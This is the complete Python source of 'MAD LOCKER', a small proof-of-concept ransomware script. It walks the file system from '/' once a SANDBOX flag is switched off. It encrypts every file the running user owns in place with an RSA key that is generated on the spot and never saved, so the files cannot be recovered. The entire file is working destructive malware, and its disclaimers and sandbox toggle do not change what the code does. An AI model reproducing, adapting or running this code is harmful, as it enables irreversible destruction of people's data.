#
#	MAD LOCKER
#		By JlXip
#			Under MIT license.
#
#	This is just a PoC. I am not responsible for any given use. You have been warned.
#	Caution: the decryption key is not saved, and thus the files will not be recoverable.
#

from os import walk, stat	# For getting data from the file system. Walk (recursive list of files) and Stat (metadata of a file).
from os.path import join	# For joining directory and file name securely.
from pwd import getpwuid	# For getting data of an user from a given UID.
from getpass import getuser as gu	# For getting the user who is running the script.

from Crypto.PublicKey import RSA	# RSA functions. For generating the keys.
from Crypto.Cipher import PKCS1_OAEP	# PKCS1_OAEP. For encrypting files in a standardized way.

SANDBOX = True	# Safe mode (controlled attack of the virus).
# SANDBOX = False	# This will fuck up the user's data. DO NOT EVEN THINK ABOUT RUNNING AS ROOT.

MS = 2048	# Modulus size. Always a multiple of 256, and no smaller than 1024.

def go(p):	# Get owner of a file
	try: return getpwuid(stat(p).st_uid).pw_name	# Try to get the owner.
	except: return ''	# If it fails, just return an empty string to invalidate the file opening (and avoid crashes).

if __name__ == '__main__':	# Make sure it's not imported from another module.
	d = '/tmp/a' if SANDBOX else '/'	# If SANDBOX mode is set, run the attack under control.
	x = [join(r, f) for r, _, ff in walk(d) for f in ff if (go(join(r, f)) == gu())]	# Get files which the user owns. Quite hard to read.

	c = PKCS1_OAEP.new(RSA.generate(MS).publickey())	# Cipher object with a randomly generated public key.

	for y in x:	# Each file.
		try:
			with open(y, 'r+') as f:	# Open it with reading and writing permissions.
				t = c.encrypt(f.read())	# Read the file and encrypt it in memory.
				f.seek(0)	# Overwrite from the beginning.
				f.write(t)	# Write the encrypted content.
				f.truncate()	# Remove the remaining bytes (if any).
		except:
			continue